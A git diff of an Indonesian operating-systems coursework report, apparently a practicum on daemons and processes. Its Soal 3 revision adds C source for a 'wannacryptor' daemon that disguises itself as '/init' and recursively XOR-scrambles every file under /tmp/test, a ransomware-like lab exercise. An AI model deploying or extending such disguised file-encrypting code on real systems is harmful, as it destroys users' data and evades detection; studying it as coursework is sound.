@@ -2473,10 +2473,10 @@ Pada kasus seperti ini, solusi preventifnya adalah secara konsisten menjalankan 
 ## • Revisi
 ### • Revisi Soal 1
 ### • Revisi Soal 2
-### • 2. a
-### File Diunduh Ulang Meskipun Sudah Ada
+#### • 2. a
+#### File Diunduh Ulang Meskipun Sudah Ada
 Fungsi download_zip() bertugas mengunduh file ZIP dari sebuah URL menggunakan perintah wget. Namun, fungsi ini tidak melakukan pengecekan apakah file ZIP tersebut sudah ada di direktori saat ini. Akibatnya, file akan selalu diunduh ulang setiap kali program dijalankan, meskipun file tersebut sebenarnya sudah tersedia.
-### **Solusi**
+#### **Solusi**
 Sebelum memanggil fungsi run_command() untuk wget, tambahkan pengecekan menggunakan access() atau fopen() untuk memverifikasi apakah file ZIP_FILE sudah ada. Contoh implementasi:
 ```c
 #include <unistd.h>
@@ -2496,4 +2496,114 @@ void download_zip() {
 }
 ```
 ### • Revisi Soal 3
+#### Menambahkan Soal 3.A: Renaming to Init dan Soal 3.B: Wannacryptor
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/prctl.h>
+#include <string.h>
+#include <dirent.h>
+#include <stdio.h>
+#include <sys/stat.h>
+#include <time.h>
+
+#define BUFFER 512
+
+void run_daemon_for_malware(char *argv[]) {
+	pid_t pid, sid;
+
+	pid = fork();
+	if (pid == -1) {
+    		exit(EXIT_FAILURE);
+	}
+
+	if (pid > 0) {
+    		exit(EXIT_SUCCESS);
+	}
+
+	sid = setsid();
+	if (sid < 0) {
+		exit(EXIT_FAILURE);
+	}
+	
+	if ((chdir("/")) < 0) {
+		exit(EXIT_FAILURE);
+	}
+	
+	close(STDIN_FILENO);
+	close(STDOUT_FILENO);
+	close(STDERR_FILENO);
+
+	prctl(PR_SET_NAME, "/init", NULL, NULL, NULL);
+	strncpy(argv[0], "/init", strlen(argv[0]));
+
+	time_t timestamp = time(NULL);
+	wannacryptor("/tmp/test", timestamp);
+}
+
+void encrypt_the_selected_user_file(const char *filepath, time_t encryptTime) {
+	FILE *file = fopen(filepath, "rb+");
+	if (file == NULL) {
+		fprintf(stderr, "Error: Unable to open file to encrypt\n");
+		exit(EXIT_FAILURE);
+	}
+
+	unsigned char buffer[BUFFER];
+	size_t number_of_bytes;
+
+	do {
+    		number_of_bytes = fread(buffer, 1, BUFFER, file);
+
+    		for (size_t i = 0; i < number_of_bytes; i++) {
+			buffer[i] ^= (encryptTime & 0xFF);
+    		}
+
+    		fseek(file, -number_of_bytes, SEEK_CUR);
+    		fwrite(buffer, 1, number_of_bytes, file);
+	} while (number_of_bytes > 0);
+
+	fclose(file);
+}
+
+void wannacryptor(const char *currentDirPath, time_t encryptTime) {
+	DIR *currdir = opendir(currentDirPath);
+	if (currdir == NULL) {
+		fprintf (stderr, "Error: Unable to open current directory folder\n");
+    		exit(EXIT_FAILURE);
+	}
+
+	struct dirent *entry;
+
+
+	while ((entry = readdir(currdir)) != NULL) {
+    		if ((strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)) {
+			continue;
+    		}
+
+		char subdirPath[BUFFER];
+    		snprintf(subdirPath, sizeof(subdirPath), "%s/%s", currentDirPath, entry->d_name);
+
+    		struct stat st;
+    		if (lstat(subdirPath, &st) == -1) {
+			continue;
+    		}
+
+    		if (S_ISREG(st.st_mode)) {
+			encrypt_the_selected_user_file(subdirPath, encryptTime);
+    		}
+		else if (S_ISDIR(st.st_mode)) {
+			wannacryptor(subdirPath, encryptTime);
+    		}
+	}
+
+	closedir(currdir);
+}
+
+int main(int argc, char *argv[]) {
+	run_daemon_for_malware(argv);
+	exit(EXIT_SUCCESS);
+}
+```
 ### • Revisi Soal 4
+Untuk Soal 4: Debugmon, tidak ada yang secara eksplisit perlu untuk direvisi apabila berdasar dengan review yang telah diberikan oleh asisten penguji saat demo.
